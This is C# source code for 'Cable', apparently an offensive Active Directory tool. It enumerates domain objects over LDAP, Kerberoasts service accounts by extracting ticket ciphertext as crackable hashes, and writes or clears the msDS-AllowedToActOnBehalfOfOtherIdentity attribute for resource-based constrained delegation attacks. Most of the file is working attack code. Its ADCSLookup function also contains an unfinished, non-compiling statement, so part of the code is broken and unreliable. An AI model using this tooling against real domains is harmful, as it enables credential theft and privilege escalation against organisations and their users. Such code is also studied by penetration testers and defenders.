using System;
using System.Collections.Generic;
using System.DirectoryServices;
using Asn1;
using System.DirectoryServices.ActiveDirectory;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Data;

namespace Cable
{
    internal class Program
    {

        static void Help(string help)
        {
            string modhelptext =
                "Cable.exe [Module]\n" +
                "Modules:\n" +
                "\tenum [options] - Enumerate LDAP\n" +
                "\tkerberoast [account] - Kerberoast a potentially supplied account, or everything\n" +
                "\tdclist - List Domain Controllers in the current Domain\n" +
                "\trbcd [options] - Write or read the msDs-AllowedToActOnBehalfOfOtherIdentity attribute\n" +
                "\ttrusts - Enumerate Active Directory Domain Trusts in the current Forest";

            string enumhelptext =
                "Options:\n" +
                "\t--users - Enumerate user objects\n" +
                "\t--computers - Enumerate computer objects\n" +
                "\t--groups - Enumerate group objects\n" +
                "\t--gpos - Enumerate Group Policy objects\n" +
                "\t--spns - Enumerate objects with servicePrincipalName set\n" +
                "\t--dclist - Enumerate domain controller objects\n" +
                "\t--admins - Enumerate accounts with adminCount set to 1\n" +
                "\t--constrained - Enumerate accounts with msDs-AllowedToDelegateTo set\n" +
                "\t--unconstrained - Enumerate accounts with the TRUSTED_FOR_DELEGATION flag set\n" +
                "\t--rbcd - Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set";

            string rbcdhelptext =
                "Options:\n" +
                "\t--delegate-to <account> - Target account to delegate access to\n" +
                "\t--delegate-from <account> - Controller account to delegate from\n" +
                "\t--write - Operation to write msDs-AllowedToActOnBehalfOfOtherIdentity\n" +
                "\t--remove - Operation to remove msDs-AllowedToActOnBehalfOfOtherIdentity";

            switch (help)
            {
                case "mod":
                    Console.WriteLine(modhelptext);
                    break;
                case "enum":
                    Console.WriteLine(enumhelptext);
                    break;
                case "rbcd":
                    Console.WriteLine(rbcdhelptext);
                    break;
            }

        }

        static string sidToAccountLookup(string sid)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(objectSid=" + sid + ")";
            ds.Filter = query;
            results = ds.FindAll();
            string account = null;

            foreach (SearchResult sr in results)
            {
                account = sr.Properties["samaccountname"][0].ToString();
            }

            return account;
        }

        static void ADCSLookup()
        {
            DirectoryEntry de = new DirectoryEntry("LDAP://RootDSE");
            String context = de.Properties["configurationNamingContext"].Value.ToString();

            string sbase = "CN=Certificate Templates,CN=Public Key Services,CN=Services," + context;

            DirectoryEntry newDe = new DirectoryEntry("LDAP://" + sbase);
            DirectorySearcher ds = new DirectorySearcher(newDe);

            ds.Filter = "(objectCategory=pKICertificateTemplate)";
            SearchResultCollection results = ds.FindAll();

            foreach(SearchResult sr in results)
            {
                Console.WriteLine("name: " + sr.Properties["name"][0].ToString());
                Console.WriteLine(
            }
        }

        static string accountToSidLookup(string account)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + account + ")";
            ds.Filter = query;
            results = ds.FindAll();
            string accountSid = null;

            foreach (SearchResult sr in results)
            {
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                accountSid = sid.Value;
            }

            return accountSid;
        }

        static void Enum(string type, string[] args)
        {
            SearchResultCollection results;

            Dictionary<string, string> queries = new Dictionary<string, string>();
            queries.Add("--users", "(&(ObjectCategory=person)(ObjectClass=user))");
            queries.Add("--computers", "(ObjectClass=computer)");
            queries.Add("--groups", "(ObjectCategory=group)");
            queries.Add("--gpos", "(ObjectClass=groupPolicyContainer)");
            queries.Add("--spns", "(&(serviceprincipalname=*)(!useraccountcontrol:1.2.840.113556.1.4.803:=2))");
            queries.Add("--admins", "(&(admincount=1)(objectClass=user))");
            queries.Add("--unconstrained", "(userAccountControl:1.2.840.113556.1.4.803:=524288)");
            queries.Add("--constrained", "(msds-allowedtodelegateto=*)");
            queries.Add("--rbcd", "(msds-allowedtoactonbehalfofotheridentity=*)");

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);
            string query = "";
            if (type == "--filter")
            {
                query = args[2];
            }
            else
            {
                bool t = queries.TryGetValue(type, out query);
                if (!t)
                {
                    Console.WriteLine("[-] Command not recognized\n");
                    Help("enum");
                    System.Environment.Exit(1);
                }
            }
            ds.Filter = query;
            results = ds.FindAll();

            if (results.Count == 0)
            {
                Console.WriteLine("[-] No objects found");
                System.Environment.Exit(0);
            }

            foreach (SearchResult sr in results)
            {
  
                if (sr.Properties.Contains("samaccountname"))
                {
                    Console.WriteLine("\nsamAccountName: " + sr.Properties["samaccountname"][0].ToString());
                }
                if (sr.Properties.Contains("objectSid"))
                {
                    SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                    Console.WriteLine("objectSid: " + sid.Value);
                }
                if (sr.Properties.Contains("distinguishedname"))
                {
                    Console.WriteLine("distinguishedName: " + sr.Properties["distinguishedname"][0].ToString());
                }
                if (sr.Properties.Contains("serviceprincipalname"))
                {
                    Console.WriteLine("servicePrincipalName: " + sr.Properties["serviceprincipalname"][0].ToString());
                }
                if (sr.Properties.Contains("msds-allowedtodelegateto"))
                {
                    Console.WriteLine("msDs-AllowedToDelegateTo: " + sr.Properties["msds-allowedtodelegateto"][0].ToString());
                }
                if (sr.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
                {
                    Console.Write("msDs-AllowedToActOnBehalfOfOtherIdentity: ");
                    RawSecurityDescriptor rsd = new RawSecurityDescriptor((byte[])sr.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"][0], 0);
                    foreach (CommonAce ace in rsd.DiscretionaryAcl)
                    {
                        Console.WriteLine(sidToAccountLookup(ace.SecurityIdentifier.ToString()));
                    }
                                        
                }

            }

        }

        static void WriteRBCD(string delegate_to, string delegate_from)
        {
            RawSecurityDescriptor rd = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + accountToSidLookup(delegate_from) + ")");
            Byte[] bDescriptor = new byte[rd.BinaryLength];
            rd.GetBinaryForm(bDescriptor, 0);

            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + delegate_to + ")";
            ds.Filter = query;
            results = ds.FindAll();

            foreach (SearchResult sr in results)
            {
                DirectoryEntry mde = sr.GetDirectoryEntry();
                if (sr.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
                {
                    Console.WriteLine("[!] This host already has a msDS-AllowedToActOnBehalfOfOtherIdentity attribute set..");
                    return;
                }
                else
                {
                    mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Add(bDescriptor);
                    mde.CommitChanges();
                    Console.WriteLine("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity");
                }
            }
        }

        static void FlushRBCD(string account)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + account + ")";
            ds.Filter = query;
            results = ds.FindAll();

            foreach (SearchResult sr in results)
            {
                if (sr.Properties.Contains("msDs-AllowedToActOnBehalfOfOtherIdentity"))
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
                    mde.CommitChanges();
                    Console.WriteLine("[+] SID cleared to msDs-AllowedToActOnBehalfOfOtherIdentity");
                }
                else
                {
                    Console.WriteLine("[-] Account does not have msDs-AllowedToActOnBehalfOfOtherIdentity set");
                    return;
                }
            }
        }
        
        static void dclist()
        {
            Domain domain = Domain.GetCurrentDomain();
            DomainControllerCollection dcs = domain.FindAllDomainControllers();
            foreach (DomainController controller in dcs)
            {
                Console.WriteLine("\n" + controller.Name + "\n===================");
                Console.WriteLine("Forest: " + controller.Forest);
                Console.WriteLine("IP: " + controller.IPAddress);
                Console.WriteLine("Version: " + controller.OSVersion + "\n");
            }
        }

        static void enumTrusts()
        {
            Forest forest = Forest.GetCurrentForest();
            TrustRelationshipInformationCollection trusts = forest.GetAllTrustRelationships();

            if (trusts.Count > 0)
            {

                foreach (TrustRelationshipInformation trust in trusts)
                {
                    Console.WriteLine("Source: " + trust.SourceName);
                    Console.WriteLine("Target: " + trust.TargetName);
                    Console.WriteLine("Direction: " + trust.TrustDirection);
                    Console.WriteLine("Trust Type: " + trust.TrustType);

                }
            }
            else
            {
                Console.WriteLine("[-] No Domain Trusts found");
            }

        }

        static string[] GetSPNs()
        {
            SearchResultCollection results;
            DirectorySearcher ds = null;

            DirectoryEntry de = new DirectoryEntry();
            ds = new DirectorySearcher(de);
            ds.Filter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";

            Console.WriteLine("[+] Finding Kerberoastable accounts...");
            results = ds.FindAll();

            var spns = new List<string>();
            if (results.Count == 0)
            {
                Console.WriteLine("[-] No Kerberoastable accounts found :(");
                System.Environment.Exit(0);
            }
            foreach (SearchResult sr in results)
            {
                spns.Add(sr.Properties["name"][0].ToString());
            }

            return spns.ToArray();
        }

        static bool Kerberoast(string[] spns)
        {
            string domain = Domain.GetComputerDomain().ToString();

            System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
            for (int i = 0; i < spns.Length; i++)
            {

                long encType = 0;
                string spn = spns[i] + "@" + domain;

                ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                Console.WriteLine("[+] Requesting ticket...");
                byte[] requestBytes = ticket.GetRequest();

                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                Console.WriteLine("[+] Decoding...");
                AsnElt apRep = AsnElt.Decode(apReqBytes);
                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {

                                            int checksumStart = cipherText.Length - 24;

                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }

                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }

                                        Console.WriteLine("[+] Got Hash!\n" + hash);
                                    }
                                }
                            }
                        }
                    }

                }
            }

            return true;
        }

        static void Main(string[] args)
        {

            try
            {
                if (args.Length > 0)
                {
                    if (args[0] == "kerberoast")
                    {
                        if (args.Length > 1)
                        {
                            string[] spn = { args[1] };
                            Kerberoast(spn);
                        }
                        else
                        {
                            string[] spns = GetSPNs();
                            Kerberoast(spns);
                        }

                    }

                    else if (args[0] == "templates")
                    {
                        ADCSLookup();
                    }

                    else if (args[0] == "rbcd")
                    {
                        string delegate_from = "";
                        string delegate_to = "";
                        string operation = "";

                        for (int i = 0; i < args.Length; i++)
                        {
                            switch (args[i])
                            {
                                case "--delegate-to":
                                    delegate_to = args[i + 1];
                                    break;
                                case "--delegate-from":
                                    delegate_from = args[i + 1];
                                    break;
                                case "--write":
                                    operation = "write";
                                    break;
                                case "--remove":
                                    operation = "remove";
                                    break;
                            }
                        }
                                                
                        if (operation == "write")
                        {
                            if (delegate_from == "" || delegate_to == "" || operation == "")
                            {
                                Console.WriteLine("[-] You must specify all the parameters required for an RBCD write\n ");
                                Help("rbcd");
                            }
                            else
                            {
                                WriteRBCD(delegate_to, delegate_from);
                            }
                        }
                        else if (operation == "remove"){
                            if (delegate_to == "" || operation == "")
                            {
                                Console.WriteLine("[-] You must specify all the parameters required for an RBCD remove\n ");
                                Help("rbcd");
                            }
                            else
                            {
                                FlushRBCD(delegate_to);
                            }
                        }
                        else
                        {
                            Console.WriteLine("[-] Please specify all parameters");
                            Help("rbcd");
                        }
                        
                    }

                    else if (args[0] == "enum")
                    {
                        if (args.Length > 1)
                        {
                            Enum(args[1], args);
                        }
                        else
                        {
                            Console.WriteLine("Usage: Cable.exe enum [Options]");
                            Help("enum");
                        }
                    }

                    else if (args[0] == "dclist")
                    {
                        dclist();
                    }

                    else if (args[0] == "trusts")
                    {
                        enumTrusts();
                    }

                    else
                    {
                        Console.WriteLine("[-] Command not recognized\n");
                        Help("mod");
                    }
                }
                else
                {
                    Help("mod");
                }
            }


            catch (Exception e)
            {
                Console.WriteLine("[-] Exception: " + e.ToString());
            }

        }
    }
}
